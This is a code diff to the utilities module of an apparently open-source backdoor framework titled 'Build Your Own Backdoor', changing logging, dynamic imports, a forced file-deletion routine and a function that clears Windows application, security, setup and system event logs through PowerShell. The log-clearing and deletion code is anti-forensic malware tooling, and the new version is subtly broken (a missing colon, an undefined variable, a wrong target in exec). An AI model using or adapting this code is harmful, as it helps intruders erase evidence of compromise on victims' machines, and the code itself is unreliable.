@@ -2,21 +2,15 @@
 # -*- coding: utf-8 -*-
 'Utilities (Build Your Own Backdoor)'
 
-# standard library
-import logging
-
-# main
-logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
-__logger__   = logging.getLogger(__name__)
-__verbose__  = True
-
-def log(info):
+def log(info, level='debug'):
     """ 
     Log output to the console (if verbose output is enabled)
 
     """
-    if __verbose__:
-        __logger__.debug(str(info))
+    import logging
+    logging.basicConfig(level=logging.DEBUG, handler=logging.StreamHandler())
+    logger = logging.getLogger(__name__)
+    getattr(logger, level if hasattr(logger, level) else 'debug')(str(info))
 
 def imports(packages, target=None):
     """ 
@@ -26,24 +20,28 @@ def imports(packages, target=None):
     :param list packages: list of packages to import
 
     `Optional`
-    :param object target: target object to import into 
+    :param object target: target object/module to import into 
 
     """
-    target = globals()
-    if target and hasattr(target, '__dict__'):
-        target = module.__dict__
+    module = globals()
+    if isinstance(packages, str):
+        packages = [packages]
+    if isinstance(target, dict)
+        module = target
+    elif hasattr(target, '__dict__'):
+        module = target.__dict__
     for package in packages:
         try:
             exec("import {}".format(package), target)
         except ImportError:
-            log(str().join(("missing package '{}' is required".format(package), " for module '{}'".format(target) if target else "")))
+            log("missing package '{}' is required".format(package))
 
 def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     """ 
     Verify that a module is compatible with the host platform
 
     `Optional`
-    :param list platforms:   list of compatible platforms
+    :param list platforms:   compatible platforms
     :param str module:       name of the module
 
     """
@@ -284,25 +282,20 @@ def delete(target):
     """
     import os
     if os.path.isfile(target):
-        try:
-            os.chmod(target, 777)
-        except: pass
         if os.name == 'nt':
+            import win32api
+            import win32con
             try:
-                _ = os.popen('attrib -h -s -r %s' % target).read()
+                win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_NORMAL)
             except: pass
-        try:
-            os.remove(target)
-        except: pass
-        try:
-            _ = os.popen(bytes('del /f /q %s' % target if os.name == 'nt' else 'rm -f %s' % target)).read()
-        except: pass
+        else:
+            try:
+                os.chmod(target, 777)
+            except OSError: pass
+        os.remove(target)
     elif os.path.isdir(target):
-        try:
-            _ = os.popen(bytes('rmdir /s /q %s' % target if os.name == 'nt' else 'rm -f %s' % target)).read()
-        except: pass
-    else:
-        pass
+        import shutil
+        shutil.rmtree(target, ignore_errors=True)
 
 def clear_system_logs():
     """ 
@@ -311,7 +304,7 @@ def clear_system_logs():
     """
     try:
         for log in ["application","security","setup","system"]:
-            output = powershell_exec('"& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"' % log)
+            output = powershell_exec("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
             if output:
                 log(output)
     except Exception as e:
